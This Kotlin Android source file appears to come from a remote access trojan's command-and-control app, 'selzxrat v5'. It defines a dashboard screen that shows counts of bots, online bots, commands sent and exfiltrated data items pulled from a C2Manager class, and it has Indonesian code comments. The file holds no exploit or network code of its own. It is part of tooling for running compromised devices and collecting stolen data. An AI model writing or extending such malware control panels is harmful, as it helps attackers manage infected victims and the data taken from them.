package com.selzxrat.v5.fragments

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.fragment.app.Fragment
import com.selzxrat.v5.C2Manager
import com.selzxrat.v5.R

class DashboardFragment : Fragment() {

    private lateinit var tvTotalBots: TextView
    private lateinit var tvOnlineBots: TextView
    private lateinit var tvCommandsSent: TextView
    private lateinit var tvExfilCount: TextView
    private lateinit var tvLastActivity: TextView

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        return inflater.inflate(R.layout.fragment_dashboard, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        tvTotalBots = view.findViewById(R.id.tvTotalBots)
        tvOnlineBots = view.findViewById(R.id.tvOnlineBots)
        tvCommandsSent = view.findViewById(R.id.tvCommandsSent)
        tvExfilCount = view.findViewById(R.id.tvExfilCount)
        tvLastActivity = view.findViewById(R.id.tvLastActivity)

        // Cek update
        C2Manager.onBotUpdate { _, bot -> updateStats() }
        C2Manager.onExfilReceived { updateStats() }

        updateStats()
    }

    private fun updateStats() {
        // INI KUNCI ANTI-CRASH
        if (!isAdded) return 

        activity?.runOnUiThread {
            C2Manager.getBots { bots ->
                tvTotalBots.text = "${bots.size}"
                tvLastActivity.text = "Last updated: ${C2Manager.getCurrentTimestamp()}"
            }
            C2Manager.getExfiltratedData { data ->
                tvExfilCount.text = "${data.size}"
            }
        }
    }
}
